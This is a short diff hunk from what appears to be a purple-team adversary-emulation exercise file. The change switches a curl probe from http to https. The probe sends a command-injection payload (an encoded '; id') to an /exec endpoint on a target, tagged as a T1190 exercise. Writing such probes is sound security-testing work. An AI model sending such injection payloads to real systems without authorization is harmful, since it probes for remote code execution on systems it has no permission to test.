@@ -14,7 +14,7 @@
     name: sh
     command: |
       curl -sk -o /dev/null -w "cmdi_probe status=%{http_code}\n" \
-        "http://#{app.web_target}/exec?cmd=%3B+id" \
+        "https://#{app.web_target}/exec?cmd=%3B+id" \
         -H "X-Purple-Team-Exercise: phase2-t1190-cmdi" \
         --max-time 10 2>&1 || true
     cleanup:
